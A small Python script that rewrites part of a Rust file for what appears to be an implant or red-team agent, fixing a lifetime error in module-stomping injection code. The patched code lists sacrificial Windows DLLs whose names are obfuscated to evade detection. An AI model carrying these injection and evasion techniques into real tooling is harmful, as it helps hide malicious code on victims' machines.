import re

with open("agent/src/injection/module_stomp.rs", "r") as f:
    text = f.read()

# Fix the lifetime error by making it not borrow
text = text.replace('''            let mut c1 = [0u8; 10]; c1.copy_from_slice(enc_str!("msfte.dll").as_ref());
            let mut c2 = [0u8; 13]; c2.copy_from_slice(enc_str!("msratelc.dll").as_ref());
            let mut c3 = [0u8; 11]; c3.copy_from_slice(enc_str!("scrobj.dll").as_ref());
            let mut c4 = [0u8; 13]; c4.copy_from_slice(enc_str!("amstream.dll").as_ref());
            
            let candidates: Vec<&[u8]> = vec![
                &c1,
                &c2,
                &c3,
                &c4
            ];
''', '''
            let mut c1_vec = Vec::new(); c1_vec.extend_from_slice(enc_str!("msfte.dll").as_ref());
            let mut c2_vec = Vec::new(); c2_vec.extend_from_slice(enc_str!("msratelc.dll").as_ref());
            let mut c3_vec = Vec::new(); c3_vec.extend_from_slice(enc_str!("scrobj.dll").as_ref());
            let mut c4_vec = Vec::new(); c4_vec.extend_from_slice(enc_str!("amstream.dll").as_ref());

            let candidates: Vec<&[u8]> = vec![
                &c1_vec[..],
                &c2_vec[..],
                &c3_vec[..],
                &c4_vec[..]
            ];
''')

with open("agent/src/injection/module_stomp.rs", "w") as f:
    f.write(text)

